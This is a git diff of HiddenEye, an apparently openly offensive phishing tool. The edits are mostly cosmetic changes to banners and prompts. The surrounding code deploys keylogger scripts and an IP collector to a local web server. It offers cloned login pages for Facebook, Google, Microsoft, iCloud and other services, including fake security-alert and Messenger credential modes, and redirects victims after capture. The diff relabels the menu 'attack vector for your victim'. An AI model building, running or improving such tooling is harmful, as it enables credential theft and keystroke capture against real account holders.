@@ -51,11 +51,11 @@ checkNgrok()
 
 def end(): #Message when HiddenEye exit
     system('clear')
-    print ('''{1} THANK YOU FOR USING HIDDENEYE! JOIN DARKSEC TEAM NOW (github.com/DarkSecDevelopers). 
-    WAITING FOR YOUR CONTRIBUTION. GOOD BYE ! {1}'''.format(RED, DEFAULT, CYAN))
+    print ('''{1}THANK YOU FOR USING ! JOIN DARKSEC TEAM NOW (github.com/DarkSecDevelopers).{1}'''.format(RED, DEFAULT, CYAN))
+    print ('''{1}WAITING FOR YOUR CONTRIBUTION. GOOD BYE !.{1}'''.format(RED, DEFAULT, CYAN))
 
 def loadModule(module):
-       print ('''{0}[{1}*{0}]{1} %s Loading module..{0}'''.format(CYAN, DEFAULT) % module)
+       print ('''{0}[{1}*{0}]{1} You Have Selected %s Module ! KEEP GOING !{0}'''.format(CYAN, DEFAULT) % module)
 
 def runPhishing(page, option2): #Phishing pages selection menu
     system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/')
@@ -175,19 +175,20 @@ def waitCreds():
 def runPEnv(): #menu where user select what they wanna use
     system('clear')
     print ('''
-  _________________________________________________________________________________  
-            ------>{2} HIDDEN EYE {2}<-------
+  ______________________________________________________________ 
+             ------>{2} HIDDEN EYE {2}<-------
          {0}KEEP EYE ON HIDDEN WORLD WITH DARKSEC.
  
           {0}[ LIVE VICTIM  ATTACK INFORMATION ]
           {0}[ LIVE KEYSTROKES CAN BE CAPTURED ]
- _________________________________________________________________________________
+ _______________________________________________________________
                              {1}'''.format(GREEN, DEFAULT, CYAN))
     
     
     if 256 != system('which php'): #Checking if user have PHP
-        print (" PHP INSTALLATION FOUND".format(CYAN, DEFAULT))
-       
+        print (" -----------------------".format(CYAN, DEFAULT))
+        print ("[PHP INSTALLATION FOUND]".format(CYAN, DEFAULT))
+        print (" -----------------------".format(CYAN, DEFAULT))
     else:
         print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run HiddenEye again.http://www.php.net/".format(RED, DEFAULT))
         exit(0)
@@ -204,7 +205,7 @@ def runPEnv(): #menu where user select what they wanna use
         print ('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n'.format(RED, DEFAULT))
         exit(0)    
    
-    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}[HIDDENEYE-DARKSEC]- >  {1}".format(CYAN, DEFAULT))
+    option = input("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}[HIDDENEYE-DARKSEC]- >  {1}".format(CYAN, DEFAULT))
     if option == '1':
         loadModule('Facebook')
         option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
@@ -312,8 +313,10 @@ if __name__ == "__main__":
     try:
         runPEnv()
         def custom(): #Question where user can input custom web-link
+            print("\n (Choose Wisely As Your Victim Will Redirect to This Link)".format(RED, DEFAULT))
+            print("\n (Leave Blank To Loop The Phishing Page)".format(RED, DEFAULT))
             print("\n {0}Insert a custom redirect url:".format(CYAN, DEFAULT))
-            custom = input("\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
+            custom = input("\nCUSTOM URL >".format(CYAN, DEFAULT))
             if 'https://' in custom:
                 pass
             else:
